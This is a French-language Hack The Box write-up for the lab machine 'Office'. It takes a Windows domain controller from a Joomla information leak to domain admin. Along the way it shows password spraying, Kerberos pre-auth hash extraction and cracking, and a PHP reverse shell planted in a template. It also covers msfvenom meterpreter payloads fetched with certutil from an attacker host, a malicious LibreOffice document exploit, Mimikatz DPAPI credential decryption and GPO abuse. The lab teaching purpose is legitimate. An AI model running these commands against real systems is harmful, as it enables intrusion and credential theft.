---
date: 2024-06-19T23:28:44-05:00
# description: ""
image: "/images/HTB-Office/Office.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Office"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Office](https://app.hackthebox.com/machines/Office)
* Niveau: Difficile
* OS: Windows
---

Office est un Windows Server 2022 fonctionnant en tant que contrôleur de domaine. Le site web hébergé sur le serveur utilise une version obsolète de Joomla, qui est vulnérable au `CVE-2023-23752`. En exploitant cette vulnérabilité, nous révélons le mot de passe de la base de données MySQL. Après énumération, nous trouvons un nom d'utilisateur valide pour le mot de passe, ce qui nous permet d'accéder à un dossier partagé contenant un fichier pcap.

Nous examinons le fichier pcap avec Wireshark, et découvrons une trame `AS-REQ` contenant toutes les informations nécessaires pour reconstruire un hash. En utilisant hashcat, nous récupérons un mot de passe qui nous permet d'accéder au tableau de bord de Joomla. En insérant un reverse shell PHP dans un template Joomla, nous obtenons notre accès initial. À partir de ce premier shell, nous nous déplaçons latéralement vers un autre utilisateur et récupérons le fichier `user.txt`.

Avec l'aide de Bloodhound, nous apprenons que l'un des utilisateurs a la permission `CanPSRemote` et est également membre du groupe `GPO Managers`. Nous réalisons un autre mouvement latéral en exploitant une version obsolète de LibreOffice via le `CVE-2023-2255`, en téléchargeant un fichier `.odt` malveillant sur un site web interne. Notre dernier mouvement latéral est accompli en décryptant certains fichiers d'identification DPAPI avec Mimikatz, ce qui permet d'obtenir le mot de passe de l'utilisateur ayant les permissions laxistes. Enfin, nous exploitons la mauvaise configuration du serveur en ajoutant l'utilisateur au groupe Administrators, ce qui nous permet de lire le fichier `root.txt`.

Addresse IP cible - `10.10.11.3`

## Balayage

Un script bash est utilisé pour le balayage, vous pouvez le trouver [ici](https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh).

```
./nmap_scan.sh 10.10.11.3 Office
```

```shell
Running detailed scan on open ports: 53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49668,51552,51567,51587,51639
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 00:30 CDT
Nmap scan report for office.htb (10.10.11.3)
Host is up (0.066s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-20 13:30:27Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Not valid before: 2023-05-10T12:36:58
|_Not valid after:  2024-05-09T12:36:58
|_ssl-date: 2024-06-20T13:31:56+00:00; +7h59m42s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51552/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51567/tcp open  msrpc         Microsoft Windows RPC
51587/tcp open  msrpc         Microsoft Windows RPC
51639/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-20T13:31:17
|_  start_date: N/A
|_clock-skew: mean: 7h59m42s, deviation: 0s, median: 7h59m41s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.29 seconds
```

Le scan nmap révèle un contrôleur de domaine nommé `office.htb` que nous ajoutons au fichier `/etc/hosts`.

```
sudo echo "10.10.11.3 office.htb dc.office.htb" | sudo tee -a /etc/hosts
```

## Enumération

En visitant `http://office.htb/` nous trouvons un blog sur les armures d'Iron Man. 

![Office blog website](/images/HTB-Office/office-blog.png)

Grâce à wappalyzer, nous découvrons que le site utilise Joomla.

![Office - Wappalyzer results](/images/HTB-Office/wappalyzer.png)

Nous avons un fichier `robots.txt` dans les résultats de nmap.

![Office - robots.txt](/images/HTB-Office/robots-txt.png)

Plusieurs répertoires sont découverts.

![robots.txt directories](/images/HTB-Office/endpoints-found.png)

`http://office.htb/administrator/` nous conduit à la page de connexion de l'administrateur; cependant, nous n'avons pas d'identifiants.

![Joomla admin panel](/images/HTB-Office/Joomla-admin-login.png)

Sur [cette](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version) page HackTricks, nous apprenons quelques techniques pour obtenir la version de Joomla et nous l'obtenons en allant à `http://office.htb//administrator/manifests/files/joomla.xml`.

![Joomla version](/images/HTB-Office/Joomla-version.png)

Pour cette version, nous trouvons le [CVE-2023-23752](https://vulncheck.com/blog/joomla-for-rce) qui est une vulnérabilité de fuite d'information. Un PoC est disponible [ici](https://github.com/0xNahim/CVE-2023-23752).

Après avoir exécuté `python3 exploit.py -u http://office.htb`, nous obtenons le mot de passe root pour MySQL `H0lOgrams4reTakIng0Ver754!`.

![DB password recovered](/images/HTB-Office/joomla-creds.png)

Notre tentative de connexion avec `administrator:H0lOgrams4reTakIng0Ver754!` échoue, nous devons donc trouver un autre moyen d'utiliser ce mot de passe. Nous savons grâce aux résultats du scan nmap que Kerberos fonctionne sur le port 88, utilisons [kerbrute](https://github.com/ropnop/kerbrute) pour énumérer les comptes valides. 

```
kerbrute userenum --dc office.htb -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

![Valid usernames found with Kerbrute](/images/HTB-Office/valid-users.png)

Avec la liste des utilisateurs valides, nous essayons maintenant de trouver une combinaison valide.

```
kerbrute passwordspray --dc office.htb -d office.htb usernames 'H0lOgrams4reTakIng0Ver754!'
```

![Valid credential pair](/images/HTB-Office/login-sucess.png)

Nous constatons que `dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!` marche!

Avec impacket, nous nous connectons à smb et nous remarquons un partage appelé `SOC Analysis`, contenant un fichier pcap nommé `Latest-System-Dump-8fbc124d.pcap` que nous téléchargeons.

```
impacket-smbclient dwolfe:'H0lOgrams4reTakIng0Ver754!'@10.10.11.3
```

![SMB login and SOC Analysis share](/images/HTB-Office/share-access.png)

Nous ouvrons le fichier pcap avec Wireshark et en filtrant pour `kerberos` nous découvrons des informations intéressantes.

![Kerberos pcap file](/images/HTB-Office/pcap.png)

> Lorsqu'un utilisateur demande un ticket d'octroi de ticket (TGT) au centre de distribution de clés (KDC), un processus appelé AS-REQ (Authentication Service Request) est utilisé. Dans le cadre de ce processus, l'utilisateur doit prouver son identité au centre de distribution de clés. Pendant l'AS-REQ, le client (l'utilisateur) envoie un horodatage crypté avec son hachage NTLM (qui est dérivé de son mot de passe). Cela prouve qu'il connaît le mot de passe sans l'envoyer directement.

Nous pouvons extraire le hachage du mot de passe du fichier pcap et utiliser hashcat pour le craquer. Étant donné que hashcat possède plusieurs modules pour les hachages Kerberos, nous devons utiliser le bon format. Passons en revue les informations dont nous disposons:

* La présence des champs `PA-DATA`, qui sont utilisés pour la pré-authentification, confirme que nous avons affaire à des paquets de pré-authentification Kerberos.
* Le type de chiffrement (etype) est spécifié comme étant `18` et il utilise AES-256.
* Nous avons le chiffre (hachage NTLM) utilisé pour crypter l'horodatage.
* Nous avons le nom d'utilisateur (`CNameString = tstark`) et le nom de domaine (`realm = OFFICE.HTB`).

Avec ces informations, nous trouvons que le hachage correspondant doit suivre le format `$krb5pa$18$user$realm$cipher`. Il correspond au module 19900 de hashcat que vous pouvez vérifier [ici](https://hashcat.net/wiki/doku.php?id=example_hashes).

Nous utiliserons un script Bash pour obtenir le hachage.

```bash
#!/bin/bash
filter=$(tshark -r $1 -Y "kerberos.msg_type == 10 && kerberos.cipher && kerberos.realm && kerberos.CNameString" -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher -E separator=$ )

for i in $(echo $filter | tr ' ' '\n') ; do

    echo "\$krb5pa\$18\$$i"

done
```

![Kerberos hash found](/images/HTB-Office/kerberos-hash.png)

En utilisant hashcat, nous obtenons le mot de passe `playboy69`.

```
hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![Kerberos hash cracked with hashcat](/images/HTB-Office/hash-cracked.png)

## Accès Initial

Avec les identifiants `administrator:playboy69` nous nous connectons au tableau de bord de Joomla, nous sommes connectés en tant que `Tony Stark`.

![Joomla Dashboard](/images/HTB-Office/joomla-dashboard.png)

Comme c'est souvent le cas avec les logiciels CMS, il est possible de modifier les templates à l'aide d'un code personnalisé. Nous exploitons cette fonction pour obtenir un shell inversé. En allant dans `System` --> `Site Templates` --> cliquez sur `Cassiopeia Details and Files` --> remplacez `error.php` par un reverse shell PHP que vous pouvez trouver sur [revshells](https://www.revshells.com/) --> Save and Close --> enfin visitez `http://office.htb/templates/cassiopeia/error.php` pour activer le reverse shell.

Sur le listener, nous obtenons un shell sous le nom de `web_account`.

![Initial foothold, shell as web_account](/images/HTB-Office/shell-office.png)

### Shell en tant que tstark

Nous ne pouvons pas lire le fichier `user.txt` avec ce compte mais nous pouvons passer à l'utilisateur `tstark`. Puisque nous avons déjà les identifiants corrects, nous pouvons utiliser [runascs](https://github.com/antonioCoco/RunasCs) pour accéder au compte, nous utiliserons un shell meterpreter.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ADDRESS> LPORT=<PORT_NUMBER> -f exe -o payload.exe
```

![malicious file generated with msfvenom](/images/HTB-Office/msfvenom-cmd.png)

Après avoir envoyé les deux fichiers à la cible, nous configurons le handler dans Metasploit.

```
certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/RunasCs.exe runascs.exe

certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT/payload.exe payload.exe
```

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <IP_ADDRESS>
set lport <PORT_NUMBERS>
run
```

En exécutant RunasCs avec notre fichier malveillant, nous obtenons un shell meterpreter.

```
runascs.exe tstark playboy69 payload.exe
```

![runascs command](/images/HTB-Office/runascs-cmd.png)

![tstark meterpreter shell](/images/HTB-Office/tstark-meterpreter.png)

Le fichier `user.txt` se trouve dans `C:\Users\tstark\Desktop`.

![user flag location](/images/HTB-Office/user-flag-metasploit.png)

De plus, nous remarquons la présence de deux utilisateurs supplémentaires sur le système (PPotts and HHogan).

![users directory on target system](/images/HTB-Office/Users-list.png)


#### Enumération de l'Active Directory

Sachant que nous avons affaire à un contrôleur de domaine, utilisons Bloodhound pour l'énumérer.

![Bloodhound command](/images/HTB-Office/bloodhound-cmd.png)

```
bloodhound-python -c all -u tstark -p 'playboy69' -d office.htb -dc dc.office.htb -ns 10.10.11.3
```

Une fois la collecte de données terminée, nous pouvons lancer Bloodhound.

```
sudo neo4j start

bloodhound --no-sandbox
```

Lorsque Bloodhound est lancé, nous utilisons le bouton "Upload Data" (télécharger les données) à droite. 

![Upload data in Bloodhound](/images/HTB-Office/upload-data-bloodhound.png)

Sélectionnez ensuite tous les fichiers json créés par Bloodhound et les informations seront importées.

![Bloodhound json files](/images/HTB-Office/bloodhound-files.png)

Nous découvrons que l'utilisateur `Hogan` a la permission `CanPSRemote` lui permettant d'initier des sessions distantes sur la cible. Dans notre cas, `evil-winrm` peut être utilisé pour cette tâche.

![hhogan CanPSRemote](/images/HTB-Office/hhogan-canpsremote.png)

De plus, cet utilisateur est également membre du groupe `GPO Managers`, ce qui indique qu'il a le droit de gérer des objets de stratégie de groupe (GPO).

![hhogan is a member of the GPO Managers group](/images/HTB-Office/gpo-managers-membership.png)

En exécutant `netstat` dans notre shell meterpreter, nous remarquons que `http` tourne sur le port `8083`, que nous n'avons pas découvert avec nmap. 

![netstat command](/images/HTB-Office/netstat-cmd.png)

Pour y accéder, nous utiliserons [ligolo-ng](https://github.com/nicocha30/ligolo-ng).

En allant sur `http://240.0.0.1:8083/`, nous trouvons un site web pour Holography Industries.

![Internal business website](/images/HTB-Office/business-website.png)

Cliquer sur `Submit Application` nous amène à `/resume.php`, une page où nous pouvons télécharger un CV pour une demande d'emploi.

![resume.php page for file submission](/images/HTB-Office/resume-php.png)

La tentative de téléchargement d'un fichier pdf échoue, et nous apprenons que cette application n'accepte que les fichiers `Doc`, `Docx`, `Docm`, et `Odt`. 

![file extensions acepted](/images/HTB-Office/files-extensions.png)

Les fichiers de cette application se trouvent dans `C:\xampp\htdocs\internal`.

![Internal files](/images/HTB-Office/internal-files.png)


### Shell en tant que ppotts

Le fichier `resume.php` appartient à l'utilisateur `PPotts`.

![resume.php file permissions](/images/HTB-Office/resume-php-permissions.png)

Nous constatons également que la version 5.2 de Libre Office est installée sur la cible. 

![Libre Office version](/images/HTB-Office/Libre-Office-version.png)

Cette version est obsolète et vulnérable au [CVE-2023-2255](https://www.libreoffice.org/about-us/security/advisories/cve-2023-2255/) avec un PoC disponible [ici](https://github.com/elweth-sec/CVE-2023-2255).

Nous commençons par créer un fichier exe malveillant.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.4 LPORT=5555 -f exe -o shell.exe
```

Nous créons ensuite un fichier odt malveillant.

```
python3 CVE-2023-2255.py --cmd 'C:\Users\Public\shell.exe' --output 'exploit.odt'
```

![Malicious odt file](/images/HTB-Office/malicious-odt.png)

Quelques minutes après avoir placé `shell.exe` dans le répertoire de notre choix et téléchargé notre fichier `exploit.odt` via l'application interne, nous obtenons un nouveau shell meterpreter sous le nom de `ppotts`.

![ppotts meterpreter shell](/images/HTB-Office/ppotts-shell.png)

### Shell en tant que hhogan

Nous utilisons `winpeas` pour énumérer le système cible et nous trouvons quelques fichiers d'identification DPAPI.

> DPAPI, qui signifie Data Protection API, est un ensemble de services cryptographiques intégrés au système d'exploitation Windows. Elle offre aux développeurs un moyen simple de protéger les données sensibles, telles que les mots de passe, les clés de chiffrement et d'autres informations confidentielles, en chiffrant et en déchiffrant les données à l'aide d'algorithmes cryptographiques robustes.

![DPAPI master keys](/images/HTB-Office/DPAPI-Master-Keys.png)

![DPAPI credential files](/images/HTB-Office/DPAPI-Credential-Files.png)

Avec `cmdkey /list`, nous constatons que les informations d'identification de l'utilisateur `hhogan` sont actuellement stockées sur la cible. 

![cmdkey command](/images/HTB-Office/cmdkey-cmd.png)

Nous trouvons les fichiers d'identification à l'adresse spécifiée.

```
Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\
```

![Credential files location](/images/HTB-Office/Credential-files.png)

Nous localisons également les clés principales.

```
Get-ChildItem -Hidden C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
```

![Credential files location](/images/HTB-Office/Master-key-files.png)

> Les fichiers d'identification DPAPI (Data Protection API) sont utilisés par Windows pour stocker en toute sécurité des informations sensibles, telles que les identifiants des utilisateurs, les mots de passe et d'autres secrets. DPAPI fournit des services de cryptage que les applications peuvent utiliser pour protéger les données, en veillant à ce qu'elles ne puissent être décryptées que par le même utilisateur que celui qui les a cryptées ou par un utilisateur disposant des clés correctes.

Nous pouvons utiliser Mimikatz pour extraire les mots de passe des fichiers d'identification. Pour déchiffrer un fichier d'identification, nous devons d'abord identifier la clé principale utilisée pour le chiffrer. Ensuite, nous devons décrypter la clé principale, puis utiliser cette clé principale décryptée pour décrypter le fichier d'identification.

Grâce à winpeas, nous savons que seules deux des trois clés principales sont utilisées pour les fichiers d'identification, celles qui se terminent par `47eb` et `fc7d`.

---
#### Note

Supposons que nous ne sachions pas quelle clé principale a été utilisée pour crypter/décrypter un fichier d'identification. Nous pouvons utiliser Mimikatz pour trouver la bonne clé.

```
dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4
```
![Mimikatz command to identify the correct master key used](/images/HTB-Office/master-key-used.png)

---

Nous commençons par décrypter la clé utilisée par deux fichiers (celle se terminant par `47eb`).

```
dpapi::masterkey /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb" /rpc
```

![Mimikatz command to decrypt master key](/images/HTB-Office/decrypted-master-key.png)

Avec la clé principale décryptée, nous décryptons le fichier d'identification et récupérons le mot de passe `H4ppyFtW183#`.

```
dpapi::cred /in:"C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4" /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
```

![hhogan password recovered](/images/HTB-Office/HHogan-password.png)

Nous nous connectons via evil-winrm sous le nom de `hhogan`.

```
evil-winrm -u "HHogan" -p "H4ppyFtW183#" -i dc.office.htb
```

![hhogan shell via evil-winrm](/images/HTB-Office/HHogan-shell.png)

## Elévation de Privilèges

Nous utilisons `Get-GPO -All` pour lister toutes les GPOs du domaine. Deux d'entre elles attirent notre attention mais nous devons vérifier si cet utilisateur a les permissions d'interagir avec elles. Nous notons également leurs IDs.

![Default domain policy](/images/HTB-Office/Default-Domain-Policy.png)

![Default DC domain policy](/images/HTB-Office/Default-DC-policy.png)

Avec [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) nous énumérons les permissions GPO. Après avoir téléchargé le script, nous devons importer le module pour être en mesure de l'utiliser.

```
Import-Module ./powerview.ps1
Get-NetGroup -name "GPO Managers"
```

![PowerView used to enumerate the GPO Managers group](/images/HTB-Office/Powerview-GPO-Managers.png)

Le groupe `GPO Managers` a un SID de `S-1-5-21-1199398058-4196589450-691661856-1117`.

Nous ciblons spécifiquement la stratégie `Default Domain Controllers Policy` et énumérons ses permissions à l'aide de PowerView.

```
Get-NetGPO | Where-Object { $_.DisplayName -eq "Default Domain Controllers Policy" } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -Name $_.Name }
```

![Default Domain Controller Policy permissions](/images/HTB-Office/GPO-Permissions.png)

Nous remarquons que le SID listé correspond au SID du groupe GPO Managers. De plus, `AceType` et `AceQualifier` sont tous deux configurés avec `AccessAllowed`. Ces informations confirment que les membres du groupe `GPO Managers` peuvent exercer toutes les permissions qu'ils ont sur `Default Domain Controllers Policy`.

Nous exploitons cette mauvaise configuration et ajoutons `hhogan` au groupe des administrateurs avec un outil appelé [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0).

```
.\sharpgpoabuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Controllers Policy"
```

![SharpGPOAbuse command](/images/HTB-Office/sharpgpoabuse-cmd.png)

Nous mettons à jour la politique pour que la tâche prenne effet.

```
gpupdate /force
```

![gpudate command](/images/HTB-Office/gpupdate.png)

L'utilisateur `hhogan` est maintenant membre du groupe `Administrators`.

![user added to the Administrators group](/images/HTB-Office/administrators-add.png)

Il suffit de se déconnecter et de se reconnecter pour accéder au bureau de l'administrateur et lire `root.txt`.

![Root flag location](/images/HTB-Office/root-flag.png)

## Mots de Fin

Merci d'avoir lu mon article, si vous voulez en savoir plus sur Active Directory (ce que je vous recommande vivement), vous trouverez ci-dessous quelques ressources utiles:

* TryHackMe vous donne accès à deux réseaux AD gratuitement à condition que vous ayez un streak de 7 jours minimum, trouvez-les [ici](https://tryhackme.com/r/hacktivities) dans la section `Networks`.
* Ils proposent également des rooms gratuites consacrées à Active Directory, telles que [Active Directory Basics](https://tryhackme.com/r/room/winadbasics), [Attacktive Directory](https://tryhackme.com/r/room/attacktivedirectory), [Ra](https://tryhackme.com/r/room/ra), [Reset](https://tryhackme.com/r/room/resetui) et [Enterprise](https://tryhackme.com/r/room/enterprise).
* HackTheBox Academy propose plusieurs modules sur Active Directory, visitez [cette](https://academy.hackthebox.com/modules) et cherchez "active directory" pour les trouver. 
* Si vous aimez les livres, je vous recommande particulièrement [Pentesting Active Directory and Windows-based Infrastructure](https://www.amazon.com/Pentesting-Active-Directory-Windows-based-Infrastructure/dp/1804611360).
